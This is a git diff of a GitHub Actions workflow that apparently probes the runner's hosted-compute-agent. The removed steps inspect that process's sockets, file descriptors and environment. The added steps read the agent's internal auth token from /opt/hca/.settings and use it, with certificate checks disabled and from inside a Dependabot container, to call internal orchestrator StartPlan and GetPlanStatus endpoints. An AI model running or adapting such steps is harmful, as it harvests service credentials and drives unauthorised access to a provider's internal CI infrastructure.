@@ -1,4 +1,4 @@
-name: HCA Connection Dump
+name: StartPlan Final
 on:
   push:
     branches: [master]
@@ -7,30 +7,27 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Dump HCA connection
-        run: |
-          # Wait for HCA to establish
-          sleep 3
-          HCA_PID=$(pgrep -f hosted-compute-agent)
-          echo "HCA PID: $HCA_PID"
-          echo "=== HCA TCP connections ==="
-          ss -tnpa | grep $HCA_PID
-          echo ""
-          echo "=== Compare: our outgoing ==="
+      - run: |
           TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
           
-          # Test with strace to see difference
-          echo "=== HCA connection details ==="
-          cat /proc/$HCA_PID/fd/7 2>/dev/null && echo "can read fd" || echo "cant read fd"
-          ls -la /proc/$HCA_PID/fd/7
+          # Use eus-01 where we know Twirp routing works
+          BASE="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
+          
+          echo "=== 1. StartPlan ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
+            curl -skv --connect-timeout 15 \
+              -H 'Authorization: Bearer $TOK' \
+              -H 'Content-Type: application/json' \
+              -d '{\"planId\":\"'$(uuidgen)'\",\"workflowTemplate\":\"ubuntu-latest\"}' \
+              '${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan' 2>&1
+          " 2>&1 | tail -30
           
           echo ""
-          echo "=== HCA env ==="
-          cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | grep -i proxy
-          
-          echo ""
-          echo "=== Check HTTP_PROXY env ==="
-          echo $http_proxy
-          echo $https_proxy
+          echo "=== 2. Then GetPlanStatus with same plan_id ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
+            curl -sk --connect-timeout 10 \
+              -H 'Authorization: Bearer $TOK' \
+              -H 'Content-Type: application/json' \
+              -d '{\"planId\":\"test-123\"}' \
+              '${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
+          " 2>&1
